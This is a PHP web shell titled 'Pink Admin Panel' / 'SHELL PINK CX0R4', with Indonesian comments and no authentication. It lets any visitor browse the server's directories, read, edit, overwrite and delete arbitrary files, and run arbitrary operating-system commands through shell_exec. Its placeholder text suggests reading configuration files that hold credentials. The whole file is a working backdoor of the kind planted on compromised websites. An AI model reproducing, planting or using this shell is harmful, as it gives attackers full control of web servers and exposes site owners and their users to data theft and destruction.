<?php
// Pengaturan Dasar & Navigasi
$current_dir = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
chdir($current_dir);

// Logika Hapus File
if (isset($_GET['delete'])) {
    $file_to_delete = $_GET['delete'];
    if (is_file($file_to_delete)) unlink($file_to_delete);
    header("Location: ?path=" . urlencode($current_dir));
}

// Logika Simpan Edit File
if (isset($_POST['save_file'])) {
    file_put_contents($_POST['filename'], $_POST['content']);
}

// Logika Execute CMD
$output = "";
if (isset($_POST['execute'])) {
    $output = shell_exec($_POST['cmd'] . " 2>&1");
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Pink Admin Panel</title>
    <style>
        body { background-color: #fff0f5; font-family: 'Courier New', Courier, monospace; color: #d02090; margin: 20px; }
        .container { background: white; border: 2px solid #ffb6c1; border-radius: 15px; padding: 20px; box-shadow: 5px 5px 15px #ffc0cb; }
        h2 { border-bottom: 2px solid #ffb6c1; padding-bottom: 10px; }
        .path { background: #ffe4e1; padding: 10px; border-radius: 5px; margin-bottom: 15px; font-weight: bold; }
        table { width: 100%; border-collapse: collapse; margin-bottom: 20px; }
        th, td { text-align: left; padding: 10px; border-bottom: 1px solid #ffecf2; }
        tr:hover { background-color: #fff5f7; }
        .terminal { background: #2d2d2d; color: #ff85a2; padding: 15px; border-radius: 8px; overflow-x: auto; margin-top: 10px; white-space: pre-wrap; }
        input[type="text"], textarea { width: 100%; border: 1px solid #ffb6c1; border-radius: 5px; padding: 8px; margin-top: 5px; }
        .btn { background: #ff85a2; color: white; border: none; padding: 8px 15px; border-radius: 20px; cursor: pointer; text-decoration: none; font-size: 12px; }
        .btn:hover { background: #ff4d7d; }
        .btn-del { background: #ff4d4d; }
    </style>
</head>
<body>

<div class="container">
    <h2>🌸 WELCOME TO SHELL PINK CX0R4</h2>
    
    <div class="path">
        Current Path: <?php echo $current_dir; ?>
    </div>

    <table>
        <thead>
            <tr>
                <th>Name</th>
                <th>Type</th>
                <th>Action</th>
            </tr>
        </thead>
        <tbody>
            <tr><td><a href="?path=<?php echo urlencode(dirname($current_dir)); ?>">.. (Back)</a></td><td>Dir</td><td>-</td></tr>
            <?php
            $files = scandir($current_dir);
            foreach ($files as $file) {
                if ($file == "." || $file == "..") continue;
                $isDir = is_dir($file);
                echo "<tr>";
                echo "<td>" . ($isDir ? "<a href='?path=".urlencode($current_dir.DIRECTORY_SEPARATOR.$file)."'>📁 $file</a>" : "📄 $file") . "</td>";
                echo "<td>" . ($isDir ? "Directory" : "File") . "</td>";
                echo "<td>";
                if (!$isDir) {
                    echo "<a class='btn' href='?path=".urlencode($current_dir)."&edit=".urlencode($file)."'>Edit</a> ";
                    echo "<a class='btn btn-del' href='?path=".urlencode($current_dir)."&delete=".urlencode($file)."' onclick='return confirm(\"Hapus file ini?\")'>Del</a>";
                }
                echo "</td>";
                echo "</tr>";
            }
            ?>
        </tbody>
    </table>

    <?php if (isset($_GET['edit'])): 
        $content = file_get_contents($_GET['edit']);
    ?>
    <div style="margin-bottom: 30px;">
        <h3>📝 Editing: <?php echo $_GET['edit']; ?></h3>
        <form method="POST">
            <input type="hidden" name="filename" value="<?php echo $_GET['edit']; ?>">
            <textarea name="content" rows="10"><?php echo htmlspecialchars($content); ?></textarea><br><br>
            <button type="submit" name="save_file" class="btn">Save Changes</button>
            <a href="?path=<?php echo urlencode($current_dir); ?>" class="btn" style="background:#ccc">Cancel</a>
        </form>
    </div>
    <?php endif; ?>

    <div class="terminal-section">
        <h3>💻 Execute Command</h3>
        <form method="POST">
            <input type="text" name="cmd" placeholder="e.g. ls -la, whoami, cat config.php" required>
            <button type="submit" name="execute" class="btn" style="margin-top:10px">Run Command</button>
        </form>
        <?php if ($output): ?>
            <div class="terminal"><?php echo htmlspecialchars($output); ?></div>
        <?php endif; ?>
    </div>
</div>

</body>
</html>